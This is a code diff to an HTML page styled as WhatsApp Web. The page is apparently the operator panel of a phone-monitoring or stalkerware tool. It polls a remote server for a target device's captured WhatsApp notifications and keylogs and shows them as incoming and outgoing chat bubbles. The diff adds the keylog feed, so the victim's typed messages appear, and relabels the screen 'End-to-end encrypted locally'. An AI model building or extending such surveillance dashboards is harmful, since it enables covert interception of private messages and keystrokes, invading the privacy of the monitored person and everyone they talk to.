@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Web (Saved)</title>
+    <title>WhatsApp Web (Live Sync)</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         /* --- CSS STYLES --- */
@@ -33,7 +33,33 @@
 
         .messages { flex: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column; gap: 4px; }
         
-        .msg { max-width: 75%; padding: 6px 10px; border-radius: 8px; font-size: 14.5px; line-height: 1.4; word-wrap: break-word; background-color: #202c33; color: #e9edef; align-self: flex-start; border-top-left-radius: 0; box-shadow: 0 1px 0.5px rgba(0,0,0,0.13); position: relative; }
+        /* MESSAGE BUBBLES */
+        .msg { 
+            max-width: 65%; 
+            padding: 6px 10px; 
+            border-radius: 8px; 
+            font-size: 14.5px; 
+            line-height: 1.4; 
+            word-wrap: break-word; 
+            color: #e9edef; 
+            position: relative; 
+            box-shadow: 0 1px 0.5px rgba(0,0,0,0.13);
+            margin-bottom: 2px;
+        }
+        
+        /* Incoming (Left) */
+        .msg.incoming {
+            background-color: #202c33;
+            align-self: flex-start;
+            border-top-left-radius: 0;
+        }
+
+        /* Outgoing (Right) */
+        .msg.outgoing {
+            background-color: #005c4b; /* WhatsApp Green */
+            align-self: flex-end;
+            border-top-right-radius: 0;
+        }
         
         .time { font-size: 10px; color: #8696a0; float: right; margin-left: 10px; margin-top: 6px; }
 
@@ -71,7 +97,7 @@
         <div class="welcome-screen" id="welcomeScreen">
             <i class="fab fa-whatsapp" style="font-size: 60px; color: #3d4a51; margin-bottom: 20px;"></i>
             <div style="font-size: 24px;">WhatsApp Web</div>
-            <div style="font-size: 14px; color: #8696a0; margin-top: 10px;">Messages are saved locally</div>
+            <div style="font-size: 14px; color: #8696a0; margin-top: 10px;">End-to-end encrypted locally</div>
         </div>
 
         <div class="chat-header" id="chatHeader" style="display:none;">
@@ -86,77 +112,120 @@
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const deviceId = urlParams.get('id');
-        const API_URL = `https://child-v9no.onrender.com/api/get-data/${deviceId}/notifications`;
         
-        // UNIQUE KEY FOR STORAGE (Device ID ke hisaab se alag-alag save hoga)
-        const STORAGE_KEY = `whatsapp_data_${deviceId || 'default'}`;
+        // TWO APIs: One for Incoming (Notifs), One for Outgoing (Keylogs)
+        const API_NOTIFS = `https://child-v9no.onrender.com/api/get-data/${deviceId}/notifications`;
+        const API_KEYLOGS = `https://child-v9no.onrender.com/api/get-data/${deviceId}/keylogs`;
+        
+        const STORAGE_KEY = `whatsapp_merged_${deviceId || 'default'}`;
 
         let groupedChats = {};
         let activeChatUser = null; 
 
-        // 1. Load Data from LocalStorage (Instant Show)
+        // 1. Load Data from LocalStorage
         function loadFromStorage() {
             const savedData = localStorage.getItem(STORAGE_KEY);
             if (savedData) {
                 groupedChats = JSON.parse(savedData);
-                renderSidebar(); // Turant render kar do
+                renderSidebar();
                 console.log("Loaded from Storage");
             }
         }
 
-        // 2. Fetch New Data
+        // 2. Fetch Both Data Sources & Merge
         async function fetchData() {
             if (!deviceId) return;
             try {
-                const res = await fetch(API_URL);
-                const data = await res.json();
-                
-                // Filter WhatsApp
-                const filtered = data.filter(d => (d.packageName || "").includes("whatsapp") || (d.appName || "").toLowerCase().includes("whatsapp"));
-                
-                processChats(filtered);
-            } catch (e) { console.error(e); }
+                // Fetch both at the same time
+                const [resNotifs, resLogs] = await Promise.all([
+                    fetch(API_NOTIFS).then(res => res.json()).catch(() => []),
+                    fetch(API_KEYLOGS).then(res => res.json()).catch(() => [])
+                ]);
+
+                // Normalize & Tag Data
+                let allMessages = [];
+
+                // Process Notifications (Incoming)
+                resNotifs.forEach(item => {
+                    if ((item.packageName || "").includes("whatsapp") || (item.appName || "").toLowerCase() === "whatsapp") {
+                        allMessages.push({
+                            type: 'incoming', // Left Side
+                            title: item.title,
+                            text: item.text,
+                            time: item.postTime || item.timestamp || Date.now() // Fallback time
+                        });
+                    }
+                });
+
+                // Process Keylogs (Outgoing)
+                resLogs.forEach(item => {
+                    // Keylogs usually don't have packageName, but appName is sent from our Android code
+                    if ((item.appName || "").toLowerCase() === "whatsapp") {
+                        allMessages.push({
+                            type: 'outgoing', // Right Side
+                            title: item.title, // Contact Name from Android Code
+                            text: item.text,
+                            time: item.timestamp || Date.now()
+                        });
+                    }
+                });
+
+                processChats(allMessages);
+
+            } catch (e) { console.error("Sync Error:", e); }
         }
 
-        // 3. Process & Save
+        // 3. Process, Group & Save
         function processChats(data) {
-            let tempGrouped = {}; // Temporary object
+            let tempGrouped = {}; 
             
-            // Re-build grouping from new data
             data.forEach(msg => {
                 const name = msg.title || "Unknown";
                 if (!tempGrouped[name]) tempGrouped[name] = [];
                 tempGrouped[name].push(msg);
             });
 
-            // Agar naya data khali hai, to purana mat udao (optional safety)
+            // Clean Duplicates & Sort Each Chat
+            for (let name in tempGrouped) {
+                // Filter Duplicates logic
+                let unique = [];
+                let seen = new Set();
+                
+                // Sort by Time (Oldest First for Display)
+                tempGrouped[name].sort((a, b) => a.time - b.time);
+
+                tempGrouped[name].forEach(msg => {
+                    // Create a unique key to prevent duplicate lines
+                    const uniqueKey = `${msg.type}-${msg.text}-${msg.time}`;
+                    if (!seen.has(uniqueKey)) {
+                        seen.add(uniqueKey);
+                        unique.push(msg);
+                    }
+                });
+                tempGrouped[name] = unique;
+            }
+
             if (Object.keys(tempGrouped).length > 0) {
                 groupedChats = tempGrouped;
-                
-                // 🔥 SAVE TO LOCALSTORAGE
                 localStorage.setItem(STORAGE_KEY, JSON.stringify(groupedChats));
             }
 
             renderSidebar();
-
             if (activeChatUser) {
                 renderMessages(activeChatUser, true); 
             }
         }
 
-        // 4. Render Sidebar (Sorted by Time)
+        // 4. Render Sidebar (Sorted by Last Message Time)
         function renderSidebar() {
             const list = document.getElementById('contactList');
             list.innerHTML = "";
             
-            // Sort Chats by Last Message Time
-            // Object.keys se naam nikalo -> Sort karo -> Loop chalao
             const sortedNames = Object.keys(groupedChats).sort((a, b) => {
                 const msgsA = groupedChats[a];
                 const msgsB = groupedChats[b];
-                // Sabse last message ka time compare karo
-                const timeA = msgsA[msgsA.length - 1]?.postTime || 0;
-                const timeB = msgsB[msgsB.length - 1]?.postTime || 0;
+                const timeA = msgsA[msgsA.length - 1]?.time || 0;
+                const timeB = msgsB[msgsB.length - 1]?.time || 0;
                 return timeB - timeA; // Newest first
             });
 
@@ -166,6 +235,9 @@
             }
 
             sortedNames.forEach(name => {
+                const msgs = groupedChats[name];
+                const lastMsg = msgs[msgs.length - 1];
+                
                 const div = document.createElement('div');
                 div.className = 'contact';
                 if (name === activeChatUser) div.classList.add('active');
@@ -175,7 +247,15 @@
                 div.innerHTML = `
                     <div class="avatar">${name.charAt(0).toUpperCase()}</div>
                     <div class="info">
-                        <div class="name">${name}</div>
+                        <div style="width:100%;">
+                            <div style="display:flex; justify-content:space-between;">
+                                <div class="name">${name}</div>
+                                <div style="font-size:11px; color:#8696a0;">${new Date(parseInt(lastMsg.time)).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})}</div>
+                            </div>
+                            <div style="font-size:13px; color:#8696a0; overflow:hidden; white-space:nowrap; text-overflow:ellipsis; margin-top:3px;">
+                                ${lastMsg.type === 'outgoing' ? '<i class="fas fa-check-double" style="color:#53bdeb; font-size:10px;"></i> ' : ''}${lastMsg.text}
+                            </div>
+                        </div>
                     </div>
                 `;
                 list.appendChild(div);
@@ -184,49 +264,49 @@
 
         function openChat(name) {
             activeChatUser = name;
-            
             document.body.classList.add('chat-active');
             document.getElementById('welcomeScreen').style.display = 'none';
             document.getElementById('chatHeader').style.display = 'flex';
             document.getElementById('headerName').innerText = name;
             document.getElementById('headerAvatar').innerText = name.charAt(0).toUpperCase();
-
             renderSidebar(); 
             renderMessages(name, false); 
         }
 
         function renderMessages(name, isAutoRefresh) {
             const box = document.getElementById('messageBox');
-            const isScrolledToBottom = box.scrollHeight - box.clientHeight <= box.scrollTop + 50;
+            // Check if user is at bottom BEFORE updating
+            const isScrolledToBottom = box.scrollHeight - box.clientHeight <= box.scrollTop + 100;
 
             if (!groupedChats[name]) return;
 
-            let rawMsgs = groupedChats[name].sort((a, b) => a.postTime - b.postTime);
-            let uniqueMsgs = [];
-            let lastText = "";
-
-            rawMsgs.forEach(msg => {
-                let currentText = msg.text.trim();
-                if (!currentText) return;
-                if (currentText === lastText) return;
-                if (lastText.length > 0 && currentText.includes(lastText) && currentText.length > lastText.length) {
-                    return; 
-                }
-                uniqueMsgs.push(msg);
-                lastText = currentText;
-            });
-
+            // Messages are already sorted by time in processChats
+            let msgs = groupedChats[name];
+            
             let htmlContent = "";
-            uniqueMsgs.forEach(msg => {
+            let lastDate = "";
+
+            msgs.forEach(msg => {
+                // Optional: Add Date Dividers (Today, Yesterday)
+                const msgDate = new Date(parseInt(msg.time)).toLocaleDateString();
+                if(msgDate !== lastDate) {
+                    htmlContent += `<div style="text-align:center; padding:10px; font-size:12px; color:#8696a0; background-color:transparent;"><span style="background:#202c33; padding:5px 12px; border-radius:10px;">${msgDate}</span></div>`;
+                    lastDate = msgDate;
+                }
+
+                // Determine Class (Incoming vs Outgoing)
+                const msgClass = msg.type === 'outgoing' ? 'outgoing' : 'incoming';
+
                 htmlContent += `
-                    <div class="msg">
+                    <div class="msg ${msgClass}">
                         ${msg.text} 
-                        <span class="time">${new Date(parseInt(msg.postTime)).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})}</span>
+                        <span class="time">${new Date(parseInt(msg.time)).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})}</span>
                     </div>`;
             });
 
             box.innerHTML = htmlContent;
 
+            // Scroll to bottom only if user was already at bottom or just opened chat
             if (!isAutoRefresh || isScrolledToBottom) {
                 box.scrollTop = box.scrollHeight;
             }
@@ -238,23 +318,17 @@
             renderSidebar();
         }
 
-        // Clear Data Function (Optional utility)
         function clearData() {
-            if(confirm("Are you sure you want to clear saved chats?")) {
+            if(confirm("Delete all saved chat history?")) {
                 localStorage.removeItem(STORAGE_KEY);
                 location.reload();
             }
         }
 
         // --- STARTUP LOGIC ---
-        // Step 1: Pehle LocalStorage se data uthao (Instant Load)
         loadFromStorage();
-        
-        // Step 2: Fir API se naya data lao (Background Update)
         fetchData();
-        
-        // Step 3: Har 2 second me refresh karte raho
-        setInterval(fetchData, 2000);
+        setInterval(fetchData, 2000); // 3 seconds refresh
 
     </script>
 </body>
